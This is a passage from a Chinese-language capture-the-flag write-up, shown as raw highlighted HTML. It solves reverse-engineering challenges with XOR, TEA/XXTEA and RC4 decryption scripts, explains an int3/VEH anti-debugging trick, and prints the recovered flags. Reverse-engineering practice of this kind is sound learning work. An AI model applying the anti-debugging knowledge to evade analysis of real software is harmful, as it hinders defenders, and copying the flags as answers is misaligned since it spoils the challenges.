number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接着分析后面的主要逻辑</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">使用了一堆列表推导式完成循环结构，对应逻辑如下：<span class="token number">1.</span>遍历<span class="token builtin">input</span>，获取index和context<span class="token number">2.</span>遍历<span class="token string">b"beginCTF"</span>为x，进行 <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">0x6</span> <span class="token operator">^</span> <span class="token number">0x7</span> <span class="token operator">+</span> <span class="token number">0xFFF</span> <span class="token operator">-</span> index<span class="token punctuation">)</span> <span class="token operator">^</span> x<span class="token punctuation">)</span> 运算，然后求和（出题人对着出题源码搓的exp，数值表达上略有出入）<span class="token number">3.</span>转为<span class="token builtin">bin</span>，去除0b两个字符，保留原始的二进制数据，遍历出来转为<span class="token builtin">int</span>存为<span class="token builtin">list</span><span class="token number">4.</span>一个字符对应一个<span class="token builtin">list</span>，组成<span class="token builtin">list</span><span class="token punctuation">[</span><span class="token builtin">list</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">]</span>，与data进行比较，全相等（<span class="token builtin">all</span>）则输出<span class="token boolean">True</span>然后直接手搓出正向解密脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> string <span class="token keyword">import</span> printabledata<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>ndata<span class="token operator">=</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">for</span> x <span class="token keyword">in</span> data<span class="token punctuation">]</span><span class="token keyword">for</span> i<span class="token punctuation">,</span>y <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>ndata<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> printable<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">6</span><span class="token operator">^</span><span class="token number">4102</span><span class="token operator">-</span>i<span class="token operator">^</span>k <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token string">b'beginCTF'</span><span class="token punctuation">)</span> <span class="token operator">==</span> y<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token comment"># begin&#123;Y@u_aRe_g00d_aT_play1ng_witH_sNake</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>熟练嵌套列表推导式的分析，以及map，enumer的使用</p><h2 id="superguessor"><a class="markdownIt-Anchor" href="#superguessor"></a> <strong>SuperGuessor</strong></h2><p>194189</p><p>194246</p><p>直接写出解密脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span><span class="token builtin">bytearray</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"5151525f59435d5f59495a59562e261d2a371a27291728242a3825213d0f323a3c3d36332a"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">51</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="not-main"><a class="markdownIt-Anchor" href="#not-main"></a> <strong>Not main</strong></h2><p>具体的原理在官方WP，看不懂，先简单记录一下操作流程，以后深入了解原理</p><p>通过实现一个全局类让程序在main函数之前就执行类的构造函数，在main函数结束后执行类的析构函数。</p><p>nt3断点的处理逻辑是，当前程序在main函数中会执行事先放置的int3，此时如果在未调试的情况下，程序将异常交给veh处理，将一个dword_405038赋值为0. 如果是调试情况下将异常交给调试器处理，如果此时调试器处理异常则不会交给veh，则dword_405038为1.main函数接下来会对输入进行虚假的判断。在判断后进入到析构函数中</p><p>析构函数会根据先前的dword_405038即图中的is_debug变量的值判断是否除零。除零进入到veh handler的除零异常处理块中</p><p>在这里进行真正的检测。正常的xxtea加密。构造函数和析构函数可以在start-&gt;__scrt_common_main_seh-&gt;initterm((_PVFV *)&amp;dword_403140, (_PVFV *)&amp;dword_403154);</p><p>所以正向的流程是</p><pre class="line-numbers language-none"><code class="language-none">实现一个全局类，在main函数之前就执行类的构造函数main函数开始 进行tea加密main函数结束析构函数开始判断isdebug &#x3D;0 进入异常处理块进行btea加密<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以直接逆向就可以了</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DELTA</span> <span class="token expression"><span class="token number">0x9e3779b9</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MX</span> <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z<span class="token operator">>></span><span class="token number">5</span><span class="token operator">^</span>y<span class="token operator">&lt;&lt;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>y<span class="token operator">>></span><span class="token number">3</span><span class="token operator">^</span>z<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>sum<span class="token operator">^</span>y<span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>p<span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">^</span>e<span class="token punctuation">]</span><span class="token operator">^</span>z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token keyword">void</span> <span class="token function">btea</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span><span class="token operator">*</span> v<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span> <span class="token keyword">const</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">uint32_t</span> y<span class="token punctuation">,</span> z<span class="token punctuation">,</span> sum<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> p<span class="token punctuation">,</span> rounds<span class="token punctuation">,</span> e<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        rounds <span class="token operator">=</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">/</span> n<span class="token punctuation">;</span><span class="token comment">//这里可以说是预定义值，n=2是rounds=32</span>        sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        z <span class="token operator">=</span> v<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">do</span>        <span class="token punctuation">&#123;</span>            sum <span class="token operator">+=</span> DELTA<span class="token punctuation">;</span>            e <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>p <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> p <span class="token operator">&lt;</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> p<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token comment">//注意这里的p是从0~n-1</span>            <span class="token punctuation">&#123;</span>                y <span class="token operator">=</span> v<span class="token punctuation">[</span>p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                z <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">+=</span> MX<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            z <span class="token operator">=</span> v<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> MX<span class="token punctuation">;</span>        <span class="token comment">//这里的MX中传入的p=n-1</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        n <span class="token operator">=</span> <span class="token operator">-</span>n<span class="token punctuation">;</span>        rounds <span class="token operator">=</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">/</span> n<span class="token punctuation">;</span>        sum <span class="token operator">=</span> rounds <span class="token operator">*</span> DELTA<span class="token punctuation">;</span>        y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">do</span>        <span class="token punctuation">&#123;</span>            e <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>p <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> p <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> p<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token comment">//注意这里的p是从n-1~0,和上面是反过来的</span>            <span class="token punctuation">&#123;</span>                z <span class="token operator">=</span> v<span class="token punctuation">[</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                y <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">-=</span> MX<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            z <span class="token operator">=</span> v<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-=</span> MX<span class="token punctuation">;</span>    <span class="token comment">//这里的MX中传入的 p=0</span>            sum <span class="token operator">-=</span> DELTA<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">detea</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span><span class="token operator">*</span> v<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span><span class="token operator">*</span> k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">uint32_t</span> v0 <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v1 <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sum <span class="token operator">=</span> <span class="token number">0xC6EF3720</span><span class="token punctuation">,</span> i<span class="token punctuation">;</span>    <span class="token class-name">uint32_t</span> delta <span class="token operator">=</span> <span class="token number">0x9e3779b9</span><span class="token punctuation">;</span>    <span class="token class-name">uint32_t</span> k0 <span class="token operator">=</span> k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> k1 <span class="token operator">=</span> k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> k2 <span class="token operator">=</span> k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> k3 <span class="token operator">=</span> k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        v1 <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v0 <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> k2<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v0 <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v0 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> k3<span class="token punctuation">)</span><span class="token punctuation">;</span>        v0 <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v1 <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> k0<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v1 <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v1 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> k1<span class="token punctuation">)</span><span class="token punctuation">;</span>        sum <span class="token operator">-=</span> delta<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v0<span class="token punctuation">;</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">uint32_t</span> v<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0xCFBE0F1B</span><span class="token punctuation">,</span> <span class="token number">0x05F3083F</span><span class="token punctuation">,</span> <span class="token number">0x4220E43B</span><span class="token punctuation">,</span> <span class="token number">0x3383AFEE</span><span class="token punctuation">,</span> <span class="token number">0xFA3237CE</span><span class="token punctuation">,</span> <span class="token number">0xECADA66E</span><span class="token punctuation">,</span> <span class="token number">0xA8D47CA7</span><span class="token punctuation">,</span> <span class="token number">0xEFC51077</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token class-name">uint32_t</span> k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">116</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">101</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//true</span>    <span class="token class-name">uint32_t</span> fk<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0x66</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x6B</span><span class="token punctuation">,</span><span class="token number">0x65</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//fake</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span> n <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token function">btea</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token operator">-</span>n<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//负号是解密</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">)</span>        <span class="token function">detea</span><span class="token punctuation">(</span>v <span class="token operator">+</span> i<span class="token punctuation">,</span> fk<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//begin&#123;not_main_is_matter!&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="goforfun待复现"><a class="markdownIt-Anchor" href="#goforfun待复现"></a> <strong>Goforfun</strong>(待复现)</h2><p>函数主体都看不明白，放着以后再看</p><p>先贴一下exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">big_int_to_byte_array</span><span class="token punctuation">(</span>big_int<span class="token punctuation">)</span><span class="token punctuation">:</span>    ans<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">while</span> big_int <span class="token punctuation">:</span>        ans<span class="token punctuation">.</span>append<span class="token punctuation">(</span>big_int<span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span>        big_int<span class="token operator">>></span><span class="token operator">=</span><span class="token number">8</span>    <span class="token keyword">return</span> ans<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>cmpString <span class="token operator">=</span> <span class="token string">"HZ0sMJXqxHgUb2b9RNg+1xw"</span>str1 <span class="token operator">=</span> <span class="token string">"8G+cazk2jqb7w01CtoKH4FsrgR3vVmQ9pPhXLAleOd/nB6DfIxMWYiUZ5SEJyNuT"</span>cmpString <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>cmpString<span class="token punctuation">)</span>str1 <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span>tmp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> cmpString<span class="token punctuation">:</span>    tmp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>str1<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>bignum <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    bignum <span class="token operator">=</span> bignum<span class="token operator">*</span><span class="token number">0x40</span> <span class="token operator">+</span> tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token comment">#print('bignum:')</span><span class="token comment">#print((bignum))</span>bytea <span class="token operator">=</span> big_int_to_byte_array<span class="token punctuation">(</span>bignum<span class="token punctuation">)</span><span class="token comment">#print(bytea)</span><span class="token keyword">def</span> <span class="token function">rc4_crypt</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    S <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    j <span class="token operator">=</span> <span class="token number">0</span>    out <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment"># 初始化S盒</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token comment"># 生成密钥流并加解密</span>    i <span class="token operator">=</span> j <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> data<span class="token punctuation">:</span>        i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        S<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> S<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        out<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">^</span> S<span class="token punctuation">[</span><span class="token punctuation">(</span>S<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> S<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token number">0x2f</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> outkey1<span class="token operator">=</span><span class="token string">'happynewyear'</span>key1 <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>key1<span class="token punctuation">)</span>flag<span class="token operator">=</span>rc4_crypt<span class="token punctuation">(</span>key1<span class="token punctuation">,</span>bytea<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> <strong>Crypto</strong></h1><h2 id="我玩青水的"><a class="markdownIt-Anchor" href="#我玩青水的"></a> 我玩青水的</h2><p>题目描述</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token 